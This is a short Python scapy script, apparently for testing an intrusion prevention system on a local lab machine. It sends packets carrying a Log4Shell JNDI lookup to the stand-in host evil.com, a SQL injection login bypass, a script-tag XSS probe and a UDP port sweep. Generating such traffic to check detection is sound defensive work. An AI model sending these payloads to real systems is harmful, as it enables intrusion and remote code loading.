# simulate_log4shell.py  (run as Administrator so raw sockets work)

from scapy.all import IP, TCP, UDP, Raw, send, RandShort

TARGET = "192.168.43.16"  # your IPS machine IP
SPORT = RandShort()  # random source port


def send_tcp(payload, dport=80):
    pkt = IP(dst=TARGET) / TCP(sport=SPORT, dport=dport, flags="PA") / Raw(load=payload)
    send(pkt, verbose=True)  # send() is layer-3 → works on Wi-Fi


print("[*] Sending Log4Shell …")
send_tcp(
    b"GET / HTTP/1.1\r\nHost: test\r\nUser-Agent: ${jndi:ldap://evil.com/a}\r\n\r\n"
)

print("[*] Sending SQLi …")
send_tcp(b"GET /login.php?user=admin' OR '1'='1 HTTP/1.1\r\nHost: test\r\n\r\n")

print("[*] Sending XSS …")
send_tcp(b"GET /search?q=<script>alert('xss')</script> HTTP/1.1\r\nHost: test\r\n\r\n")

print("[*] Sending UDP port-sweep …")
for port in range(1, 25):
    pkt = IP(dst=TARGET) / UDP(sport=SPORT, dport=port)
    send(pkt, verbose=False)
print("✅  All packets sent.")
